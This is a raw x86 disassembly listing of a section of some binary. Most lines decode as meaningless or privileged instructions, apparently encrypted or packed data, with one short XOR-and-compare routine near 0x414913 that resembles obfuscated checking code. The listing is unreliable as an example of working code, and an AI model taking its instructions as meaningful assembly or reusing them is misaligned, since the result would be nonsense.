  4143e1:	sub    DWORD PTR ds:0x7865cc63,0x21b02649
  4143eb:	ss in  al,0x7
  4143ee:	or     eax,0x266fafff
  4143f3:	or     dl,BYTE PTR [eax]
  4143f5:	sahf   
  4143f6:	jb     0x4143db
  4143f8:	sub    eax,0x8e88d07d
  4143fd:	icebp  
  4143fe:	push   edi
  4143ff:	test   DWORD PTR [ebp-0x34f1209],0x453964e0
  414409:	cwde   
  41440a:	dec    edi
  41440b:	aad    0x1d
  41440d:	adc    edx,DWORD PTR [edx-0x6cf1e0e4]
  414413:	inc    edx
  414414:	ins    DWORD PTR es:[edi],dx
  414415:	mov    dl,0xe5
  414417:	leave  
  414418:	idiv   BYTE PTR [esp+edx*4-0x6727fbd2]
  41441f:	retf   0x314b
  414422:	test   DWORD PTR [ecx],esp
  414424:	adc    al,0x87
  414426:	inc    ebx
  414427:	aam    0xae
  414429:	mov    ecx,0x759e6f12
  41442e:	xchg   DWORD PTR [esi],esp
  414430:	outs   dx,DWORD PTR ds:[esi]
  414431:	push   0x14
  414433:	sub    eax,0xf7d0fd38
  414438:	stos   DWORD PTR es:[edi],eax
  414439:	mov    bh,0xd0
  41443b:	(bad)  
  41443c:	rcl    DWORD PTR [ecx-0x742f3ece],cl
  414442:	mov    bl,BYTE PTR [ebx-0x36]
  414445:	sub    al,0xec
  414447:	mov    eax,ds:0x72da32c8
  41444c:	test   eax,0xd14f2e1
  414451:	mov    eax,ds:0x446cbccd
  414456:	sti    
  414457:	ins    BYTE PTR es:[edi],dx
  414458:	dec    esp
  414459:	cwde   
  41445a:	retf   0xae9c
  41445d:	fbstp  TBYTE PTR [esi+0x7c74325c]
  414463:	enter  0xe8da,0xa0
  414467:	adc    eax,0xe242796c
  41446c:	test   BYTE PTR [esi],al
  41446e:	pushf  
  41446f:	mov    ds:0x53865a7d,al
  414474:	rcr    esp,0x61
  414477:	mov    bl,0xff
  414479:	out    dx,eax
  41447a:	in     eax,dx
  41447b:	pop    es
  41447c:	mov    al,BYTE PTR [eax+0x300c96fe]
  414482:	mov    ch,BYTE PTR [ebp-0x264e70b6]
  414488:	sbb    DWORD PTR [edx-0x552eb5f9],ebx
  41448e:	ficom  DWORD PTR [eax+ebp*8+0x3]
  414492:	inc    eax
  414493:	xor    ah,bl
  414495:	jg     0x414501
  414497:	pop    ds
  414498:	pop    ebx
  414499:	sbb    bh,ch
  41449b:	sbb    BYTE PTR [edx+0x6d6efcc2],ah
  4144a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144a2:	pop    edi
  4144a3:	jp     0x414457
  4144a5:	pop    ecx
  4144a6:	xchg   edi,eax
  4144a7:	xor    bl,BYTE PTR [edx-0x3a]
  4144aa:	or     ecx,DWORD PTR [eax+0x61c38236]
  4144b0:	adc    dh,BYTE PTR [ecx-0x9]
  4144b3:	xchg   ebx,eax
  4144b4:	sbb    BYTE PTR [ebp-0x2f],cl
  4144b7:	popf   
  4144b8:	mov    bh,0x97
  4144ba:	fwait
  4144bb:	sub    eax,edx
  4144bd:	je     0x4144e1
  4144bf:	or     BYTE PTR [edi],0x33
  4144c2:	push   cs
  4144c3:	dec    eax
  4144c4:	inc    esi
  4144c5:	adc    al,0xf2
  4144c7:	ror    BYTE PTR [eax+esi*8-0x257b504a],cl
  4144ce:	adc    eax,0xe0cf39db
  4144d3:	sahf   
  4144d4:	imul   dl
  4144d6:	push   edx
  4144d7:	scas   ax,WORD PTR es:[edi]
  4144d9:	and    edi,DWORD PTR [ecx-0x46]
  4144dc:	int    0x6f
  4144de:	jmp    0xc6ba:0x6239f675
  4144e5:	ja     0x4144ed
  4144e7:	popf   
  4144e8:	jmp    0xc94d0e5e
  4144ed:	xor    bl,BYTE PTR [ecx]
  4144ef:	ret    0x2c44
  4144f2:	ja     0x414516
  4144f4:	data16 clc 
  4144f6:	inc    edi
  4144f7:	adc    eax,0x8747459e
  4144fc:	mov    cl,0xf
  4144fe:	in     eax,dx
  4144ff:	scas   al,BYTE PTR es:[edi]
  414500:	dec    esi
  414501:	shl    DWORD PTR [edi],cl
  414503:	dec    ebp
  414504:	sbb    ah,ah
  414506:	mov    ebp,DWORD PTR [eax+0xbcdc7d2]
  41450c:	ja     0x414532
  41450e:	xchg   esp,eax
  41450f:	cmp    al,0x4d
  414511:	push   edx
  414512:	add    al,ch
  414514:	xchg   ecx,eax
  414515:	push   esp
  414516:	fndisi(8087 only) 
  414518:	pop    ebp
  414519:	adc    al,BYTE PTR [ecx+0x1e]
  41451c:	sbb    al,0x6b
  41451e:	dec    eax
  414520:	or     BYTE PTR [edi+0x5d60619f],cl
  414526:	pop    eax
  414527:	sub    ebp,DWORD PTR [ecx-0x4a]
  41452a:	push   edi
  41452b:	cmp    ecx,DWORD PTR [edi+esi*2-0x5e]
  41452f:	cmp    BYTE PTR [edi],dl
  414531:	gs or  cl,BYTE PTR ss:[eax+0x62c61cc5]
  414539:	fld    DWORD PTR [esi+ecx*8-0x58]
  41453d:	mov    ebx,0x7d799231
  414542:	fwait
  414543:	jns    0x4145a9
  414545:	mov    ebp,0x5106ad66
  41454a:	push   ebx
  41454b:	cmp    BYTE PTR [ecx],al
  41454d:	in     al,dx
  41454e:	cld    
  41454f:	fnstsw WORD PTR [eax+0x67]
  414552:	sub    al,0x66
  414554:	adc    DWORD PTR cs:[ebx-0x77a2ea67],ecx
  41455b:	inc    ecx
  41455c:	mov    ecx,0x748ea04d
  414561:	jmp    0x414511
  414563:	adc    eax,0xb9769beb
  414568:	dec    edi
  414569:	loope  0x4145b2
  41456b:	pop    esi
  41456c:	push   eax
  41456d:	(bad)  
  41456f:	or     ch,bl
  414571:	aad    0x71
  414573:	ja     0x4145bc
  414575:	cmp    ebx,DWORD PTR [edi]
  414577:	mov    DWORD PTR [ebx-0x1ede6d7d],ecx
  41457d:	push   edi
  41457e:	test   ebx,edi
  414580:	fdivr  DWORD PTR [ebx]
  414582:	(bad)  
  414583:	xor    al,0x7e
  414585:	inc    edi
  414587:	ins    DWORD PTR es:[edi],dx
  414588:	add    DWORD PTR [eax-0x3f],0xffffffd0
  41458c:	into   
  41458d:	mov    eax,0xeb069a18
  414592:	push   ecx
  414593:	xor    bl,BYTE PTR [ebp+0x4beeee78]
  414599:	push   ss
  41459a:	push   0xac78e97d
  41459f:	int3   
  4145a0:	dec    eax
  4145a1:	adc    ebp,DWORD PTR [ebx]
  4145a3:	retf   0x8cc5
  4145a6:	aaa    
  4145a7:	sbb    ah,BYTE PTR [eax+0x35]
  4145aa:	sub    bh,0x73
  4145ad:	pop    eax
  4145ae:	test   DWORD PTR [edi-0x4d],eax
  4145b1:	adc    ch,ah
  4145b3:	push   esp
  4145b4:	and    al,0xe7
  4145b6:	dec    edi
  4145b7:	xchg   BYTE PTR [ecx],al
  4145b9:	jb     0x4145c6
  4145bb:	xchg   ebp,eax
  4145bc:	test   al,0x1f
  4145be:	jmp    0x57118593
  4145c3:	clc    
  4145c4:	int3   
  4145c5:	ret    
  4145c6:	mov    eax,0x4034bc78
  4145cb:	add    al,0x40
  4145cd:	iret   
  4145ce:	call   0xb1f5:0x447cdcac
  4145d5:	push   es
  4145d6:	add    BYTE PTR [bx+0x36],dh
  4145da:	jnp    0x41464e
  4145dc:	pop    esi
  4145dd:	sahf   
  4145de:	xchg   DWORD PTR [edx],edi
  4145e0:	pushf  
  4145e1:	call   0x5692ba69
  4145e6:	or     al,bl
  4145e8:	mov    ah,0x99
  4145ea:	mov    eax,ds:0xcf439d9e
  4145ef:	(bad)  
  4145f0:	(bad)  
  4145f1:	adc    DWORD PTR [ebx-0xc23991b],edi
  4145f7:	test   dl,0x82
  4145fa:	data16 jo 0x41460a
  4145fd:	sbb    bl,BYTE PTR [eax-0xef384c2]
  414603:	add    al,0x3f
  414605:	sbb    DWORD PTR [edi],0x9f6815bf
  41460b:	fmul   st(1),st
  41460d:	mov    ebp,0x7d48e555
  414612:	inc    eax
  414613:	push   ss
  414614:	sub    ah,al
  414616:	mov    cl,0x39
  414618:	mov    ebx,0xf08b1d31
  41461d:	jmp    0x3e3f:0xe5be677c
  414624:	mov    esp,0x3d57687
  414629:	loop   0x414678
  41462b:	mov    al,ds:0xb8a6fa06
  414630:	enter  0x866c,0xf
  414634:	mov    edi,0x81464471
  414639:	mov    ebp,0x1d53e64
  41463e:	aad    0x9b
  414640:	ins    DWORD PTR es:[edi],dx
  414641:	call   0xb1a0df3a
  414646:	mov    dh,0x33
  414649:	add    esp,DWORD PTR [esi+0x6856c7a9]
  41464f:	aas    
  414650:	jmp    0xa7549a6d
  414655:	in     eax,dx
  414656:	xchg   ecx,eax
  414657:	outs   dx,BYTE PTR ds:[esi]
  414658:	in     eax,0xff
  41465a:	(bad)  
  41465b:	stc    
  41465c:	popf   
  41465d:	jg     0x4146d9
  41465f:	xchg   ebx,eax
  414660:	xchg   bp,ax
  414662:	pushf  
  414663:	repz popa 
  414665:	arpl   WORD PTR [esi],dx
  414667:	cdq    
  414668:	je     0x4146e8
  41466a:	push   ebx
  41466b:	mov    ecx,0xd9c90644
  414670:	retf   
  414671:	add    dl,ah
  414673:	xlat   BYTE PTR ds:[ebx]
  414674:	daa    
  414675:	xchg   esi,eax
  414676:	or     eax,0x68
  414679:	stos   DWORD PTR es:[edi],eax
  41467a:	sbb    ebx,0xad01f5f3
  414680:	test   BYTE PTR [esi+0x45f26fc5],0xa0
  414687:	or     ah,ch
  414689:	dec    esp
  41468a:	jmp    0x9b097e89
  41468f:	iret   
  414690:	push   edi
  414691:	cli    
  414692:	cs mov ebx,0xde98817c
  414698:	jns    0x414628
  41469a:	pop    ds
  41469b:	jb     0x414711
  41469d:	xor    al,0x4c
  41469f:	shl    esp,1
  4146a1:	adc    DWORD PTR [ebp+eiz*8-0x32b12562],esp
  4146a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146a9:	stos   BYTE PTR es:[edi],al
  4146aa:	shl    edx,1
  4146ac:	lds    esi,FWORD PTR [esi+0x1e]
  4146af:	out    dx,eax
  4146b0:	les    ebp,FWORD PTR [eax+0x4c]
  4146b3:	adc    eax,0x77f9b44b
  4146b8:	and    ch,ch
  4146ba:	stos   DWORD PTR es:[edi],eax
  4146bb:	sbb    BYTE PTR ss:[eax],bh
  4146be:	xchg   ebp,eax
  4146bf:	(bad)  
  4146c1:	into   
  4146c2:	retf   
  4146c3:	pushf  
  4146c4:	sbb    eax,0xc3225db2
  4146c9:	adc    edi,DWORD PTR [edx-0x538d87ef]
  4146cf:	sbb    ebp,DWORD PTR [edx+0x50]
  4146d2:	pusha  
  4146d3:	ss cmp ah,bl
  4146d6:	xchg   ebx,eax
  4146d7:	cld    
  4146d8:	push   ss
  4146d9:	aam    0x8
  4146db:	addr16 mov edi,0xedd11989
  4146e1:	imul   esi,DWORD PTR [ecx-0x18],0xfffffff8
  4146e5:	mov    al,0xa2
  4146e7:	mov    esi,0xd597a016
  4146ec:	mov    ah,0x2
  4146ee:	pop    edi
  4146ef:	adc    esp,DWORD PTR [esp+esi*4+0x3f5e47b4]
  4146f6:	pop    ds
  4146f7:	cmp    BYTE PTR [edx+0x48],al
  4146fa:	dec    edx
  4146fb:	inc    esi
  4146fc:	fsubr  QWORD PTR [ebx-0x4ab4f4cc]
  414702:	cmp    ah,ah
  414704:	test   DWORD PTR [ebx-0x7c],edi
  414707:	inc    ebx
  414708:	adc    eax,0x45bec1a6
  41470d:	pop    ss
  41470e:	and    esi,edx
  414710:	mov    eax,0x1a81ef44
  414715:	cld    
  414716:	shrd   DWORD PTR [ebx],edx,cl
  414719:	adc    al,0xc3
  41471b:	cmp    eax,0x1ad41040
  414720:	outs   dx,BYTE PTR ds:[esi]
  414721:	rol    DWORD PTR [ebx+0x42],0xb
  414725:	enter  0x6f8e,0x50
  414729:	les    ecx,FWORD PTR [edi]
  41472b:	aaa    
  41472c:	cmp    bh,BYTE PTR [esi-0x5e]
  41472f:	js     0x414726
  414731:	lods   eax,DWORD PTR ds:[esi]
  414732:	ds ret 
  414734:	xlat   BYTE PTR ds:[ebx]
  414735:	jge    0x41475b
  414737:	jp     0x4146e0
  414739:	dec    edi
  41473a:	outs   dx,DWORD PTR ds:[esi]
  41473b:	rcl    al,0x92
  41473e:	pop    ecx
  41473f:	cmc    
  414740:	push   edi
  414741:	push   0xe4cb1e29
  414746:	xchg   DWORD PTR [edi+0x7d],ecx
  414749:	dec    ebx
  41474a:	cmp    BYTE PTR [bp+di-0x7d],cl
  41474e:	jne    0x41478c
  414750:	leave  
  414751:	js     0x4146de
  414753:	inc    eax
  414754:	test   al,0xbc
  414756:	(bad)  
  414757:	cmp    BYTE PTR [edi+0x6c],al
  41475a:	pop    edi
  41475b:	jae    0x41471e
  41475d:	pop    esp
  41475e:	ror    DWORD PTR [edi],1
  414760:	xor    dh,ch
  414762:	push   ds
  414763:	sbb    cl,BYTE PTR [esi]
  414765:	stc    
  414766:	out    0x76,eax
  414768:	mov    esp,0x6b1717db
  41476d:	dec    esi
  41476e:	push   ss
  41476f:	fnsave [edx]
  414771:	out    0x14,al
  414773:	call   0x899bd998
  414778:	test   bl,0xa0
  41477b:	cmp    bh,dh
  41477d:	dec    ebx
  41477e:	pop    ebp
  41477f:	or     al,0x65
  414781:	or     eax,0xcac30707
  414786:	dec    ecx
  414787:	adc    eax,0x6c76e418
  41478c:	retf   0xe900
  41478f:	test   ah,al
  414791:	in     eax,0x3f
  414793:	out    0xc1,al
  414795:	cmp    DWORD PTR [ecx+0x6e],0x77
  414799:	sti    
  41479a:	lahf   
  41479b:	mov    ebx,DWORD PTR [ecx]
  41479d:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41479f:	lods   eax,DWORD PTR ds:[esi]
  4147a0:	leave  
  4147a1:	and    bl,BYTE PTR [ecx-0x4d6bfd7]
  4147a7:	outs   dx,DWORD PTR ds:[esi]
  4147a8:	adc    al,BYTE PTR ds:0x8cad0a0a
  4147ae:	pop    edx
  4147af:	xchg   ecx,eax
  4147b0:	(bad)  
  4147b1:	mov    WORD PTR [edi-0x1b],ds
  4147b4:	stc    
  4147b5:	out    dx,eax
  4147b6:	pop    edi
  4147b7:	repnz ins BYTE PTR es:[edi],dx
  4147b9:	pusha  
  4147ba:	mov    bl,0xe6
  4147bc:	and    BYTE PTR [esi-0x5e],al
  4147bf:	mov    ch,0xef
  4147c1:	test   bh,cl
  4147c3:	stos   BYTE PTR es:[edi],al
  4147c4:	mov    ebp,0x6411869
  4147c9:	dec    ebp
  4147ca:	ds inc esi
  4147cc:	aas    
  4147cd:	fld    TBYTE PTR [ebp-0x7c]
  4147d0:	sti    
  4147d1:	mov    ch,0xf6
  4147d3:	fldcw  WORD PTR [ebx-0x39071dc9]
  4147d9:	xchg   esi,eax
  4147da:	loop   0x41475c
  4147dc:	retf   0x255
  4147df:	sbb    al,0xc7
  4147e1:	ror    bh,cl
  4147e3:	pop    ds
  4147e4:	mov    DWORD PTR [ebx+0x59995f34],esp
  4147ea:	pop    ebx
  4147eb:	cmp    ecx,DWORD PTR [ecx]
  4147ed:	cmc    
  4147ee:	fsubr  DWORD PTR [edx+ebp*8-0x6d]
  4147f2:	pop    ebx
  4147f3:	retf   0x6564
  4147f6:	mov    edx,0x820d4355
  4147fb:	dec    ecx
  4147fc:	jne    0x4147e9
  4147fe:	xchg   esp,eax
  4147ff:	retf   
  414800:	jl     0x414866
  414802:	or     DWORD PTR [edi+0x216facab],esp
  414808:	(bad)  [ebx+0x43032e65]
  41480e:	enter  0xa993,0xd1
  414812:	repz (bad) 
  414814:	mov    bh,0x60
  414816:	add    ch,BYTE PTR [ebx+0x4535b9fa]
  41481c:	ss enter 0xf401,0xfe
  414821:	mov    ebp,0x1d4efa12
  414826:	xchg   esp,eax
  414827:	add    DWORD PTR [ecx-0x7a1b625a],esp
  41482d:	imul   esp,DWORD PTR [ebx],0xfffffffe
  414830:	jl     0x4147cd
  414832:	pop    edx
  414833:	int3   
  414834:	cmp    bh,BYTE PTR [esi-0x775fd5ae]
  41483a:	outs   dx,BYTE PTR ds:[esi]
  41483b:	or     BYTE PTR [edi+0x4d],dh
  41483e:	push   esi
  41483f:	inc    edx
  414840:	inc    ebp
  414841:	mov    ebx,0x6971dabd
  414846:	popf   
  414847:	retf   
  414848:	jle    0x4148b7
  41484a:	retf   
  41484b:	call   0xba870f8a
  414850:	stos   DWORD PTR es:[edi],eax
  414851:	cmp    eax,0x4ce06b40
  414856:	push   ds
  414857:	fidiv  DWORD PTR [ebp-0x66]
  41485a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41485b:	mov    BYTE PTR [ebp+0x50],al
  41485e:	sti    
  41485f:	mov    al,0xe0
  414861:	fbld   TBYTE PTR [edx]
  414863:	aad    0x87
  414865:	push   esp
  414866:	dec    ecx
  414867:	bound  edx,QWORD PTR [ecx+0x4a]
  41486a:	push   ebp
  41486b:	das    
  41486c:	sub    al,0xf
  41486e:	cmc    
  41486f:	pop    ecx
  414870:	or     BYTE PTR [ecx+0x76],dl
  414873:	jecxz  0x4148bb
  414875:	sbb    eax,0x7fb266ca
  41487a:	aam    0xa1
  41487c:	mov    edi,0xe3106200
  414881:	jmp    DWORD PTR ds:0x7e43880f
  414887:	push   esi
  414888:	xor    eax,0x5c43d795
  41488d:	pop    esi
  41488e:	jae    0x414880
  414890:	xor    cl,BYTE PTR [edx-0x6d]
  414893:	sbb    DWORD PTR [esi+0x6d2601ea],ebx
  414899:	in     al,0xb
  41489b:	cs jp  0x414859
  41489e:	ffreep st(7)
  4148a0:	fdivr  DWORD PTR gs:[ebp+ebx*4+0x4844efac]
  4148a8:	dec    esp
  4148a9:	test   eax,0xe13a7a8c
  4148ae:	sbb    eax,DWORD PTR [eax+0x22]
  4148b1:	pop    DWORD PTR [eax-0x4f]
  4148b4:	leave  
  4148b5:	xor    ebp,DWORD PTR [ecx-0x6da058b1]
  4148bb:	cmc    
  4148bc:	(bad)  
  4148bd:	and    dl,al
  4148bf:	test   eax,0x288512ad
  4148c4:	or     ebp,ebp
  4148c6:	popf   
  4148c7:	inc    esp
  4148c8:	xchg   ecx,eax
  4148c9:	and    al,0x3d
  4148cb:	sbb    ebp,DWORD PTR [esi]
  4148cd:	and    al,0xd1
  4148cf:	cmp    al,0xc5
  4148d1:	mov    bl,0x50
  4148d3:	jg     0x41492d
  4148d5:	test   ch,cl
  4148d7:	out    0x87,al
  4148d9:	dec    esp
  4148da:	popf   
  4148db:	cli    
  4148dc:	int3   
  4148dd:	retf   
  4148de:	rol    cl,0x93
  4148e1:	push   eax
  4148e2:	adc    ch,BYTE PTR [eax]
  4148e4:	inc    DWORD PTR [ebx-0x57]
  4148e7:	fisttp DWORD PTR [ebx]
  4148e9:	pop    es
  4148ea:	push   ds
  4148eb:	pop    ds
  4148ec:	mov    edi,0x75c70fd2
  4148f1:	call   0xabc1aebc
  4148f6:	imul   ebx,edi,0xd4bf990d
  4148fc:	and    dh,al
  4148fe:	jo     0x41492c
  414900:	xchg   BYTE PTR [esi+0x2c34ac63],dl
  414906:	arpl   dx,di
  414908:	test   al,0x8c
  41490a:	out    0xee,al
  41490c:	call   0xf455:0x8bb79c1d
  414913:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41491a:	mov    bl,BYTE PTR [ebp-0x1]
  41491d:	cmp    dl,bl
  41491f:	je     0x416d50
  414925:	mov    ecx,DWORD PTR [ebp-0x5c]
  414928:	mov    edx,DWORD PTR [ebp-0xc]
  41492b:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  414932:	mov    ebx,DWORD PTR [ebp+0xc]
  414935:	xor    ecx,eax
  414937:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272fa]
  41493e:	jne    0x416e84
  414944:	mov    ecx,DWORD PTR [ebp-0x5c]
  414947:	mov    edx,DWORD PTR [ebp+0xc]
  41494a:	xor    ecx,eax
  41494c:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272fa]
  414954:	mov    edx,DWORD PTR [ebp-0x18]
  414957:	xor    edx,eax
  414959:	add    edx,esi
  41495b:	cmp    ecx,edx
  41495d:	mov    ecx,DWORD PTR [ebp-0x14]
  414960:	mov    DWORD PTR [ebp+0x8],ecx
  414963:	mov    ecx,DWORD PTR [ebp+0x8]
  414966:	je     0x416f8c
  41496c:	xor    ecx,eax
  41496e:	add    ecx,esi
  414970:	mov    ecx,0xf641bea
  414975:	je     0x416dd8
  41497b:	mov    edx,DWORD PTR [ebp+0x8]
  41497e:	jmp    0x416cd1
  414983:	outs   dx,DWORD PTR ds:[esi]
  414984:	sub    edi,DWORD PTR [ebx]
  414986:	xchg   BYTE PTR [edi],bh
  414988:	div    BYTE PTR [esi+0x72]
  41498b:	daa    
  41498c:	mov    dl,0xdf
  41498e:	mov    ah,bl
  414990:	adc    bh,BYTE PTR [ebx]
  414992:	push   es
  414993:	dec    esi
  414994:	xchg   esp,eax
  414995:	jp     0x414a12
  414997:	mov    cl,0x9c
  414999:	jnp    0x414a16
  41499b:	jp     0x4149da
  41499d:	fld    DWORD PTR [eax-0x2a]
  4149a0:	xchg   ebx,eax
  4149a1:	(bad)  
  4149a2:	pop    ebp
  4149a3:	inc    edi
  4149a4:	add    al,0xba
  4149a6:	push   ebx
  4149a7:	(bad)  
  4149a8:	imul   ebx,DWORD PTR [ebx+0x4d],0xf
  4149ac:	jb     0x41497b
  4149ae:	pop    es
  4149af:	imul   ebp,DWORD PTR [ecx-0x7aafd34b],0xe3b5d26e
  4149b9:	jmp    0x414a07
  4149bb:	fsubr  DWORD PTR [edx]
  4149bd:	push   cs
  4149be:	add    BYTE PTR [esi-0x709d388c],ch
  4149c4:	mov    BYTE PTR [edi],bl
  4149c6:	clc    
  4149c7:	mov    al,ds:0x97907681
  4149cc:	rcr    DWORD PTR [edi],0xe4
  4149cf:	popf   
  4149d0:	cmp    DWORD PTR [esi+0x4],esp
  4149d3:	xchg   edi,ebx
  4149d5:	add    DWORD PTR gs:[edx+eax*1+0x7b],eax
  4149da:	and    BYTE PTR [esi+0x1e],0x58
  4149de:	push   edx
  4149df:	in     al,0xbd
  4149e1:	ffreep st(4)
  4149e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149e4:	lock xchg ecx,eax
  4149e6:	mov    BYTE PTR [edx],bl
  4149e8:	(bad)  
  4149e9:	push   ds
  4149ea:	test   al,0xd4
  4149ec:	add    eax,0xd312ff54
  4149f1:	mov    edx,0x81277746
  4149f6:	or     BYTE PTR [edx-0x12d83729],bl
  4149fc:	jae    0x41499a
  4149fe:	pop    ss
  4149ff:	(bad)  [esi]
  414a01:	xchg   ebp,eax
  414a02:	add    eax,DWORD PTR [esi]
  414a04:	shr    cl,1
  414a06:	pusha  
  414a07:	neg    DWORD PTR [eax*4+0x27b67eaa]
  414a0e:	jge    0x4149a1
  414a10:	stos   BYTE PTR es:[edi],al
  414a11:	sar    BYTE PTR [esi],0xa6
  414a14:	jl     0x414a3b
  414a16:	jne    0x4149dc
  414a18:	or     eax,0xfdeb1c2c
  414a1d:	ss push 0xffffffef
  414a20:	jmp    0x4149fb
  414a22:	scas   eax,DWORD PTR es:[edi]
  414a23:	mov    WORD PTR [ebx-0x7e65277],?
  414a29:	outs   dx,BYTE PTR ds:[esi]
  414a2a:	jmp    0xc655:0x9010b3b7
  414a31:	bound  ebx,QWORD PTR [edx+0x19]
  414a34:	fwait
  414a35:	jo     0x414a2a
  414a37:	mov    edx,0xa758f1e6
  414a3c:	imul   ebp,DWORD PTR [ecx-0x274250e3],0x64183443
  414a46:	mov    esp,0xc5d0c65c
  414a4b:	(bad)  
  414a4c:	sub    DWORD PTR [ecx+ebp*1+0x1dfdc8ac],eax
  414a53:	inc    esi
  414a54:	xlat   BYTE PTR ds:[ebx]
  414a55:	imul   esp,DWORD PTR [edi-0x37ebb89],0x74d99fa7
  414a5f:	(bad)  
  414a60:	int    0x4a
  414a62:	(bad)  
  414a63:	out    0x95,eax
  414a65:	mov    al,ds:0x3fbbd429
  414a6a:	mov    bh,0xb0
  414a6c:	shr    BYTE PTR [ebx],0xa8
  414a6f:	fdiv   st(0),st
  414a71:	pop    edi
  414a72:	pop    ds
  414a73:	repnz repnz icebp 
  414a76:	mov    ch,0x2c
  414a78:	dec    edx
  414a79:	shr    bl,cl
  414a7b:	paddd  mm2,QWORD PTR [ebx]
  414a7e:	xchg   BYTE PTR [esi-0x70],dl
  414a81:	mov    ah,0xfb
  414a83:	xchg   DWORD PTR [ecx+0x52],esp
  414a86:	fisttp QWORD PTR [esp+edi*2+0x5393414a]
  414a8d:	retf   
  414a8e:	sbb    bh,dl
  414a90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a91:	lods   al,BYTE PTR ds:[esi]
  414a92:	mov    al,ds:0x393d25ed
  414a97:	xchg   ecx,eax
  414a98:	dec    eax
  414a99:	xor    ebx,0xffffffb2
  414a9c:	mov    dh,0x89
  414a9e:	test   edi,ebp
  414aa0:	xchg   DWORD PTR [eax+0x2ac081e0],ebx
  414aa6:	xchg   esi,eax
  414aa7:	adc    DWORD PTR [ebp-0x48f2e1cd],ecx
  414aad:	(bad)  
  414aae:	mov    ebx,edi
  414ab0:	mov    ebp,0x57370bf4
  414ab5:	daa    
  414ab6:	push   esi
  414ab7:	rcl    DWORD PTR [ebx],cl
  414ab9:	(bad)  
  414abb:	fbld   TBYTE PTR [ecx+edi*2+0x46123767]
  414ac2:	in     eax,0xa3
  414ac4:	mov    dh,0x3a
  414ac6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ac7:	cld    
  414ac8:	das    
  414ac9:	inc    eax
  414aca:	cmc    
  414acb:	cmp    eax,0x9ca9d4f1
  414ad0:	call   0xbfbcfc70
  414ad5:	jg     0x414b01
  414ad7:	sub    al,BYTE PTR [edi+eiz*8+0x2f2f924f]
  414ade:	jmp    0x63f0:0x7afcd94e
  414ae5:	dec    ebx
  414ae6:	and    ecx,DWORD PTR [ebx-0x4b]
  414ae9:	mov    ds:0xde7e36fd,eax
  414aee:	pop    ebp
  414aef:	iret   
  414af0:	mov    gs,WORD PTR [ecx-0x1955df6c]
  414af6:	mov    ebp,0x651eb777
  414afb:	daa    
  414afc:	arpl   WORD PTR [eax],bx
  414afe:	jnp    0x414b10
  414b00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b01:	cwde   
  414b02:	sub    al,0xa1
  414b04:	(bad)  
  414b05:	dec    ebx
  414b06:	jnp    0x414b67
  414b08:	jno    0x414aa8
  414b0a:	mov    bl,0x55
  414b0c:	cmp    al,0xd6
  414b0e:	adc    al,0x44
  414b10:	cmovge ecx,DWORD PTR [ebp-0x1b]
  414b14:	lods   eax,DWORD PTR ds:[esi]
  414b15:	mov    cl,0x12
  414b17:	xchg   esp,eax
  414b18:	pusha  
  414b19:	sbb    DWORD PTR [ecx],ebp
  414b1b:	mov    eax,0xd040ca27
  414b20:	inc    BYTE PTR [eax+0x23]
  414b23:	fidiv  DWORD PTR [ecx+0x4095b860]
  414b29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b2a:	mov    ch,0x95
  414b2c:	xchg   ebp,eax
  414b2d:	cwde   
  414b2e:	icebp  
  414b2f:	fidivr DWORD PTR [eax-0x59]
  414b32:	inc    eax
  414b33:	ja     0x414b8f
  414b35:	xlat   BYTE PTR ds:[ebx]
  414b36:	jle    0x414ba2
  414b38:	push   ds
  414b39:	dec    ecx
  414b3a:	cmp    BYTE PTR [ecx],ch
  414b3c:	xchg   DWORD PTR [edx-0x6ddc9d1d],edi
  414b42:	add    BYTE PTR [esp+ebp*4],bl
  414b45:	and    ebp,DWORD PTR [esi]
  414b47:	cwde   
  414b48:	cmp    al,0x56
  414b4a:	or     esp,eax
  414b4c:	(bad)  
  414b4d:	pop    eax
  414b4e:	mov    edx,0x1bd403a4
  414b53:	repz xchg edi,eax
  414b55:	mov    ds:0xad470c11,eax
  414b5a:	or     al,0x17
  414b5c:	cmp    dh,BYTE PTR [ecx+0x5252fc65]
  414b62:	push   ebp
  414b63:	gs mov edi,0x57935810
  414b69:	xchg   ecx,eax
  414b6a:	shl    BYTE PTR [edx],cl
  414b6c:	pop    ss
  414b6d:	mov    ebx,0xa6a7e771
  414b72:	gs icebp 
  414b74:	sub    eax,0xaee1cbdf
  414b79:	add    ch,cl
  414b7b:	pop    edi
  414b7c:	mov    WORD PTR [eax+0x48b790f6],cs
  414b82:	xor    BYTE PTR [ebx],ah
  414b84:	jl     0x414bea
  414b86:	mov    dh,al
  414b88:	sbb    ch,BYTE PTR [ecx-0x7f]
  414b8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b8c:	jmp    0x161a:0xba3dfbc6
  414b93:	dec    edi
  414b94:	in     eax,0x3b
  414b96:	fst    QWORD PTR [ecx]
  414b98:	push   cs
  414b99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b9a:	cmp    al,0xf1
  414b9c:	xchg   ebx,eax
  414b9d:	sar    BYTE PTR [edx+0x68cf32db],cl
  414ba3:	pop    esp
  414ba4:	mov    ebp,0x32869c8a
  414ba9:	xor    eax,0x42e2e157
  414bae:	dec    esp
  414baf:	mov    ebx,0xec8f5f2d
  414bb4:	sub    DWORD PTR [ebx+esi*1+0x11395fe9],ecx
  414bbb:	mov    BYTE PTR [ebp+0x58],bl
  414bbe:	mov    BYTE PTR [esi+edi*2+0x5be5d6fe],al
  414bc5:	cs mov ah,0xaa
  414bc8:	clc    
  414bc9:	je     0x414bf5
  414bcb:	in     al,dx
  414bcc:	popa   
  414bcd:	retf   0xdcd0
  414bd0:	jae    0x414bb4
  414bd2:	bound  eax,QWORD PTR [edx]
